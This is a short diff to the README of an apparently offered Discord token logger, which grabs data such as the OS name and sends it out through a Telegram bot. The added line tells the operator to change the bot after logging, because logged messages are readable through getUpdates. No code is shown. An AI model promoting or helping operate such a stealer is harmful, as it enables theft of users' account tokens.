@@ -1,6 +1,8 @@
 # discord-token-logger
 discord token logger with telegram bot and config
 
+NOTE: recommended to change bot after log! (you can read messages with getUpdates method) 
+
 #### what this logger can grab:
 
 > os name <br />
